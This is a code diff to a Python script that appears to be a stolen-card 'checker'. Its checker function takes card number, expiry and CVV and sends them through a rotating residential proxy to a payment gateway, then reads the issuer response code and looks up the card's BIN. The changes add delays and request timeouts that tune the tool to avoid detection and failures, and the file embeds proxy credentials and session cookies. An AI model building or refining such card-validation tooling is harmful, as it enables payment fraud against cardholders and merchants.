@@ -91,11 +91,11 @@ def definir_tipo_cartao(card):
     
     
 def checker(card, month, year, cvv):
-
+        
         
         
         try:
-
+            time.sleep(2)
         
 
             p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
@@ -152,7 +152,7 @@ def checker(card, month, year, cvv):
                     #'Cookie': '_fbp=fb.1.1712014315500.1863181539; PHPSESSID=0b5fb7f955ebe8f673edd97fa4fd3a97; _gid=GA1.2.219304938.1712270413; _gat=1; _ga=GA1.1.1072852156.1712014452; _ga_6BRBZCZGJH=GS1.2.1712270413.3.1.1712270597.41.0.0; _ga_4Y1SMXCRK4=GS1.1.1712270413.3.1.1712270612.0.0.0'
                     }
 
-                    response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+                    response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=40)
                     
                     auth_key = response.json()['authenticationKey']
 
@@ -194,11 +194,11 @@ def checker(card, month, year, cvv):
                     'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                     }
 
-                    response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p)
+                    response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p, timeout=40)
                     elapsed_time = time.time() - start_time
                 
                     MSegundos = round(elapsed_time, 2)
-                    time.sleep(1)
+                    time.sleep(2)
                     if 'Retry Transaction' in response.text:
                         code = response.json()['issuerResponseDetails']['issuerResponseCode']
                         bin = api_bin(card[:6])              
